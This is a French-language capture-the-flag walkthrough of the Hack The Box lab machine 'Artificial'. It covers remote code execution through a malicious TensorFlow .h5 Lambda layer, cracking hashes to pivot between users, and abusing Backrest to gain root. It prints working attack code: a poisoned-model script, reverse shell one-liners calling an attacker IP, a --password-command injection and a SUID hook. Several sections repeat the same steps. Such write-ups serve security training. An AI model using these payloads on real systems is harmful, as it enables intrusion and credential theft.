![Cover](cover.png)

### Énumération Initiale

La phase de reconnaissance commence par un scan **Nmap** complet pour identifier la surface d'attaque réseau.

```bash
# Scan rapide de tous les ports TCP
nmap -p- -vvv --min-rate 10000 10.10.11.74

# Scan de détection de services et scripts par défaut
nmap -p 22,80 -sCV 10.10.11.74
```

Le scan révèle deux ports ouverts :
1.  **Port 22 (SSH)** : OpenSSH 8.2p1 (Ubuntu).
2.  **Port 80 (HTTP)** : Nginx 1.18.0, redirigeant vers `http://artificial.htb/`.

J'ajoute l'entrée correspondante dans mon fichier `/etc/hosts` pour résoudre le **Virtual Host**.

### Analyse de la Plateforme Web

Le site web est une application dédiée à l'intelligence artificielle permettant aux utilisateurs de s'enregistrer et d'uploader des modèles **TensorFlow**. 

L'énumération des répertoires avec **feroxbuster** ne révèle aucune page cachée critique, mais confirme l'utilisation de **Flask** (via les pages d'erreur 404 par défaut) et fournit des fichiers de configuration pour les développeurs : un `requirements.txt` et un `Dockerfile`.

**Points clés identifiés :**
*   **Tech Stack** : Python, Flask, TensorFlow-cpu 2.13.1.
*   **Fonctionnalité** : Upload de fichiers `.h5` (**Hierarchical Data Format**).
*   **Comportement** : L'application traite les modèles pour afficher des prédictions.

> **Schéma Mental :** L'application accepte des fichiers de modèles complexes (`.h5`). En **Machine Learning**, un modèle n'est pas qu'une suite de données, c'est une structure d'objets sérialisés. Si l'application utilise `Keras` pour charger ces modèles sans environnement sécurisé, elle est vulnérable à une **Insecure Deserialization**.

### Identification de la Vulnérabilité : TensorFlow Deserialization

Le format `.h5` utilisé par **Keras/TensorFlow** est connu pour permettre l'exécution de code arbitraire lors du chargement d'un modèle malveillant, notamment via la couche `Lambda`. Cette couche permet d'insérer des fonctions Python arbitraires dans le graphe du modèle.

### Préparation de l'Exploit (Payload Generation)

Pour garantir la compatibilité de la sérialisation, j'utilise le `Dockerfile` fourni pour construire un conteneur local identique à l'environnement cible.

```bash
# Construction de l'image Docker
docker build . -t artificial

# Lancement du conteneur avec un volume partagé
docker run -it -v $(pwd):/share artificial:latest
```

À l'intérieur du conteneur, je rédige un script Python utilisant une couche `Lambda` pour injecter une commande système. Je commence par un **ICMP Exfiltration** (ping) pour valider l'exécution.

```python
import tensorflow as tf

def exploit(x):
    import os
    # Commande de test : Ping vers ma machine d'attaque
    os.system("ping -c 2 10.10.14.6")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("/share/exploit.h5")
```

### Exécution et Premier Shell

Après avoir uploadé `exploit.h5` sur le dashboard, je clique sur **"View Predictions"**. Cette action force le serveur à charger le modèle en mémoire, déclenchant la fonction `exploit`.

Je confirme l'exécution via **tcpdump** :
```bash
sudo tcpdump -ni tun0 icmp
```

Une fois l'exécution confirmée, je génère un nouveau payload pour obtenir un **Reverse Shell**.

```python
def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'")
    return x
```

Je prépare mon listener **Netcat** et déclenche à nouveau la lecture du modèle sur le site.

```bash
nc -lnvp 443
```

Le serveur établit la connexion, me donnant un accès initial en tant qu'utilisateur `app`. Je stabilise immédiatement mon shell :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

### Pivot vers l'utilisateur gael

L'énumération locale révèle une base de données **SQLite** dans le répertoire de l'application : `~/app/instance/users.db`.

```bash
sqlite3 ~/app/instance/users.db "SELECT * FROM user;"
```

Je récupère plusieurs hashes MD5. Le hash de l'utilisateur `gael` (`c99175974b6e192936d97224638a34f8`) est rapidement cassé via une **Wordlist Attack** (CrackStation/RockYou), révélant le mot de passe : `mattp005numbertwo`.

Je pivote vers l'utilisateur `gael` via SSH pour obtenir un environnement stable.

```bash
ssh gael@artificial.htb
```

---

### Énumération Post-Exploitation & Pivot vers `gael`

Une fois le **Foothold** obtenu en tant qu'utilisateur `app`, je commence par une énumération locale pour identifier les vecteurs de mouvement latéral. Le système héberge deux utilisateurs réels : `app` et `gael`.

L'application Flask tourne dans le répertoire personnel de `app`. L'examen de la structure des fichiers révèle une base de données **SQLite** contenant des informations sensibles.

```bash
# Énumération des utilisateurs et de la base de données
cat /etc/passwd | grep 'sh$'
ls -l ~/app/instance/users.db

# Extraction des hashes MD5
sqlite3 ~/app/instance/users.db "SELECT username, password FROM user;"
```

La table `user` contient plusieurs entrées, dont une pour l'utilisateur `gael` avec le hash **MD5** : `c99175974b6e192936d97224638a34f8`.

> **Schéma Mental : Pivot via réutilisation de mots de passe**
> 1. Accès initial via vulnérabilité applicative (**Deserialization**).
> 2. Extraction de la base de données locale (**Post-Exploitation**).
> 3. Crack de hash hors-ligne (**MD5**).
> 4. Tentative de **Credential Stuffing** sur les comptes système (SSH/SU).

Le hash est rapidement cassé via **CrackStation** ou **Hashcat**, révélant le mot de passe : `mattp005numbertwo`. Ce mot de passe est valide pour une connexion **SSH** ou un `su` vers l'utilisateur `gael`.

```bash
# Pivot vers gael
sshpass -p 'mattp005numbertwo' ssh gael@artificial.htb
```

---

### Énumération Interne & Vecteur Root

En tant que `gael`, je constate que l'utilisateur appartient au groupe `sysadm`. Une analyse des services réseau locaux via `ss` montre deux ports intéressants écoutant uniquement sur la **Loopback** : le port `5000` (Flask) et le port `9898`.

```bash
# Identification des services locaux
ss -tnlp
# Recherche du service associé au port 9898
grep -r ':9898' /etc/systemd/system/ 2>/dev/null
```

Le port `9898` correspond à **Backrest**, une interface Web pour l'outil de sauvegarde **Restic**. Pour y accéder, je mets en place un **SSH Tunneling** (Local Port Forwarding).

```bash
# Tunneling depuis la machine d'attaque
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```

L'énumération du système de fichiers révèle une archive de sauvegarde dans `/var/backups/backrest_backup.tar.gz`, lisible par le groupe `sysadm`. Cette archive contient une copie de la configuration de **Backrest**, incluant le hash **Bcrypt** de l'administrateur de l'interface.

```bash
# Extraction et analyse de la configuration
tar -xf /var/backups/backrest_backup.tar.gz -C /tmp/
cat /tmp/backrest/.config/backrest/config.json
```

Le fichier `config.json` contient un hash encodé en **Base64**. Après décodage, j'obtiens un hash **Bcrypt** (`$2a$10$...`) que je soumets à **Hashcat** (Mode 3200). Le mot de passe identifié est `!@#$%^`.

---

### Escalade de Privilèges : Exploitation de Backrest

Avec les identifiants `backrest_root:!@#$%^`, j'accède à l'interface de gestion. Puisque **Backrest** s'exécute avec les privilèges de **root**, toute action de sauvegarde ou de restauration peut être détournée.

#### Méthode 1 : Abus des Hooks (RCE)
**Backrest** permet de configurer des **Hooks** (scripts s'exécutant avant ou après une sauvegarde).

> **Schéma Mental : RCE via Hooks**
> 1. Création d'un **Repository** arbitraire (ex: dans `/tmp`).
> 2. Création d'un **Plan** de sauvegarde.
> 3. Ajout d'un **Hook** de type "Command" exécutant un **Reverse Shell** ou un `chmod +s /bin/bash`.
> 4. Déclenchement manuel de la sauvegarde pour forcer l'exécution du script en tant que **root**.

#### Méthode 2 : Injection de commande via "Run Command"
L'interface propose une fonction "Run Command" pour interagir directement avec **Restic**. L'application concatène l'entrée utilisateur sans filtrage suffisant.

```bash
# Payload à injecter dans l'interface "Run Command"
check --password-command 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
```

#### Méthode 3 : Exfiltration de clés SSH
Il est possible de créer un **Plan** ciblant le répertoire `/root`, d'effectuer une sauvegarde, puis d'utiliser le "Snapshot Browser" pour restaurer ou télécharger directement la clé privée `id_rsa` de l'utilisateur **root**.

```bash
# Cheatsheet Pro : Accès Root final
ssh -i root_id_rsa root@artificial.htb
cat /root/root.txt
```

---

### Mouvement Latéral : De `app` à `gael`

Après avoir obtenu un accès initial en tant que **app**, l'énumération du système de fichiers révèle une base de données **SQLite** située dans `/home/app/app/instance/users.db`. L'extraction des données de la table `user` permet d'identifier plusieurs comptes et leurs **MD5 hashes** respectifs.

```bash
# Extraction des hashes depuis la base SQLite
sqlite3 instance/users.db "SELECT username, password FROM user;"

# Crack des hashes via CrackStation ou Hashcat
# gael : c99175974b6e192936d97224638a34f8 -> mattp005numbertwo
```

Le mot de passe identifié permet une transition vers l'utilisateur **gael** via **SSH** ou `su`. L'utilisateur **gael** possède des privilèges étendus via son appartenance au groupe **sysadm**, ce qui s'avérera crucial pour la suite.

---

### Élévation de Privilèges : Analyse de Backrest

L'énumération des services locaux via `ss -tnlp` montre un service écoutant sur le port **9898**. L'analyse des fichiers de configuration dans `/etc/systemd/system/` confirme qu'il s'agit de **Backrest**, une interface Web pour l'outil de sauvegarde **restic**.

> **Schéma Mental : Exploitation de la chaîne de confiance des sauvegardes**
> 1. **Accès aux données sensibles** : Le groupe **sysadm** permet de lire les archives de sauvegarde existantes.
> 2. **Extraction de secrets** : Récupération du hash de l'administrateur de l'application de sauvegarde.
> 3. **Abus de fonctionnalité** : Utiliser les privilèges de l'application (exécutée en **root**) pour compromettre l'OS hôte.

En inspectant `/var/backups/backrest_backup.tar.gz`, accessible par le groupe **sysadm**, je récupère le fichier `config.json`. Ce dernier contient un hash **bcrypt** encodé en **Base64** pour l'utilisateur `backrest_root`.

```bash
# Décodage et crack du hash Backrest
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
# Résultat : !@#$%^
```

Après avoir établi un **SSH Tunneling** (`-L 9898:localhost:9898`), je me connecte à l'interface de **Backrest**. L'application s'exécutant avec les privilèges **root**, elle offre trois vecteurs d'élévation distincts.

#### Vecteur 1 : Exfiltration via Backup & Restore
En créant un **Repository** local (ex: `/dev/shm/repo`) et un **Plan** ciblant le répertoire `/root`, je peux déclencher une sauvegarde. L'interface permet ensuite de naviguer dans le **Snapshot**, de restaurer les fichiers ou de télécharger une archive `.tar.gz` contenant les secrets de **root** (`id_rsa`, `root.txt`).

#### Vecteur 2 : Abus de Hooks (Persistance & RCE)
Les **Plans** de sauvegarde supportent des **Hooks** (scripts pré/post exécution). En configurant un **Hook** de type "Command" exécutant un binaire malveillant, je peux obtenir une exécution de code directe en tant que **root**.

```bash
# Exemple de commande Hook pour créer un binaire SUID
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

#### Vecteur 3 : Injection d'arguments Restic
L'interface propose une fonction "Run Command" pour exécuter des commandes **restic** personnalisées. L'application concatène l'entrée utilisateur sans filtrage suffisant, permettant l'injection de l'option `--password-command`. Cette option exécute une commande système pour récupérer la clé du dépôt.

```bash
# Injection via Run Command dans l'UI Backrest
check --password-command 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
```

Cette injection déclenche un **Reverse Shell** avec les privilèges **root**.

---

### Beyond Root : Analyse Post-Exploitation

La compromission de la machine **Artificial** met en lumière plusieurs faiblesses architecturales critiques :

1.  **Supply Chain & ML Security** : L'utilisation de **TensorFlow** (version 2.13.1) avec le format legacy `.h5` (HDF5) expose le serveur à une **Deserialization Vulnerability** via la couche `Lambda`. Dans un environnement de production, l'exécution de modèles ML non signés doit être isolée dans des **Sandboxes** ou des **Containers** sans accès réseau.
2.  **Gestion des privilèges de sauvegarde** : L'application **Backrest** agit comme un proxy de privilèges. Bien que l'interface soit protégée par un mot de passe, le fait qu'elle puisse lire n'importe quel fichier système et exécuter des commandes arbitraires en tant que **root** en fait une cible de choix. Une segmentation via des **Linux Capabilities** spécifiques (ex: `CAP_DAC_READ_SEARCH`) plutôt qu'un accès **root** complet aurait limité l'impact.
3.  **Secrets en clair dans les backups** : La présence d'une sauvegarde de la configuration de l'application de sécurité elle-même dans un répertoire lisible par un groupe d'utilisateurs (`sysadm`) a permis le pivot final. C'est une illustration parfaite de la **Circular Dependency** en sécurité : le système de sauvegarde devient le maillon faible de la chaîne de confiance.